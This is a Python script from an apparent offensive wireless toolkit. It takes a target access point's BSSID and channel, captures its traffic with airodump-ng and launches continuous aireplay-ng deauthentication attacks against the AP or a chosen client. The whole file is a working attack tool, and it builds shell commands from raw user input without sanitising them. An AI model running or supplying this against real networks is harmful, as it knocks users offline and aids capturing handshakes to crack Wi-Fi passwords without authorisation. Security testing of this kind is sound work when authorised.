#!/usr/bin/env python
# coding=UTF-8

import os
import socket
import operator
import sys
import time
import StringIO

cap_file_dir = '/root/ArmsCommander/wirelessattacks/Cylon-Raider-Lite/logs/'
capture_Interface = 'wlan1mon'

def deauth_target(attack_selected, capture_BSSID, capture_Channel, cap_file, capture_Interface):
    if attack_selected == "DIRECT":
        cmd_String = "aireplay-ng -0 0 -a {0} --ignore-negative-one {1}".format(capture_BSSID, capture_Interface)
        os.system(cmd_String)
    elif attack_selected == "CLIENT":
        client_mac = str(raw_input("Enter connected client MAC addr: "))
        cmd_String = "aireplay-ng -0 0 -c %s -a %s --ignore-negative-one %s" % (
            client_mac,
            capture_BSSID,
            capture_Interface
        )
        os.system(cmd_String)

def direct_or_client_deauth_question(capture_BSSID, capture_Channel, cap_file, capture_Interface):
    user_input = str(raw_input("Press 1 for DIRECT targeting, press 2 for CLIENT targeting for DEAUTH packets: "))
    if user_input == "1":
        attack_selected = "DIRECT"
    elif user_input == "2":
        attack_selected = "CLIENT"
    else:
        print 'You have entered a invalid option'
        direct_or_client_deauth_question(attack_selected, capture_BSSID, capture_Channel, cap_file, capture_Interface)
    deauth_target(attack_selected, capture_BSSID, capture_Channel, cap_file, capture_Interface)
    return attack_selected, capture_BSSID, capture_Channel, cap_file, capture_Interface



def save_target_lock(capture_BSSID, capture_Channel, cap_file, capture_Interface):
    # temporarily saves files to a few text files for StringIO to pick it up for the other phase
    a = '/root/ArmsCommander/wirelessattacks/Cylon-Raider-Lite/logs/temp_BSSID'
    b = '/root/ArmsCommander/wirelessattacks/Cylon-Raider-Lite/logs/temp_Channel'
    c = '/root/ArmsCommander/wirelessattacks/Cylon-Raider-Lite/logs/temp_cap_file'
    d = '/root/ArmsCommander/wirelessattacks/Cylon-Raider-Lite/logs/temp_cap_interface'

    a = open(a,'w')
    a.write(capture_BSSID)
    a.close()

    b = open(b,'w')
    b.write(capture_Channel)
    b.close()

    c = open(c,'w')
    c.write(cap_file)
    c.close()

    d = open(d,'w')
    d.write(capture_Interface)
    d.close()

    print '[+] Your attack parameters have been temporarily saved for the Replay-Attack Portion in a new Window'
    start_targeted_capture(capture_BSSID, capture_Channel, cap_file, capture_Interface)

    return a,b,c,d

def start_targeted_capture(capture_BSSID, capture_Channel, cap_file, capture_Interface):
    cmd_String = "airodump-ng --bssid {0} -c {1} --write {2} {3}".format(
        capture_BSSID,
        capture_Channel,
        cap_file,
        capture_Interface
    )
    print cmd_String
    os.system(cmd_String)

    return capture_BSSID, capture_Channel, cap_file, capture_Interface

def gather_target_info():
    capture_BSSID = str(raw_input("Enter target AP MAC Addr (BSSID): "))
    capture_Channel = str(raw_input("Enter target AP CHANNEL: "))
    timestr = (time.strftime("%Y%m%d-%H%M%S"))
    cap_file = cap_file_dir + '_' + timestr + '_' + '.cap'
    save_target_lock(capture_BSSID, capture_Channel, cap_file, capture_Interface)
    return capture_BSSID, capture_Channel, cap_file, capture_Interface

def read_temp_files():
    # read temp files
    # re-saves data in a new variable (because we are in a new window now, so we need to import the data)
    a = '/root/ArmsCommander/wirelessattacks/Cylon-Raider-Lite/logs/temp_BSSID'
    a = open(a,'r')
    a = a.read()
    capture_BSSID = a
    b = '/root/ArmsCommander/wirelessattacks/Cylon-Raider-Lite/logs/temp_Channel'
    b = open(b,'r')
    b = b.read()
    capture_Channel = b
    c = '/root/ArmsCommander/wirelessattacks/Cylon-Raider-Lite/logs/temp_cap_file'
    c = open(c,'r')
    c = c.read()
    cap_file = c
    d = '/root/ArmsCommander/wirelessattacks/Cylon-Raider-Lite/logs/temp_cap_interface'
    d = open(d,'r')
    d = d.read()
    capture_Interface = d

    print '[*] Attack parameters loaded, BSSID: %s, Channel: %s, Capture_File: %s, Capture_Interface: %s' % (
        capture_BSSID,
        capture_Channel,
        cap_file,
        capture_Interface
    )
    direct_or_client_deauth_question(capture_BSSID, capture_Channel, cap_file, capture_Interface) # needs to incorporate the read variables
    return capture_BSSID, capture_Channel, cap_file, capture_Interface
def main():

    opt_List = [
        '\n\t#0. Return to Main Menu',
        '#1. Select Targeting Capture Mode',
        '#2. Start the de-auth replay attack'
    ]

    print ("\n\t".join(opt_List))
    opt_Choice = str(raw_input("Enter a OPTION: "))
    if opt_Choice == "1":
        gather_target_info()
    elif opt_Choice == "2":
        # direct_or_client_deauth_question(capture_BSSID, capture_Channel, cap_file, capture_Interface)
        read_temp_files()
    return
main()
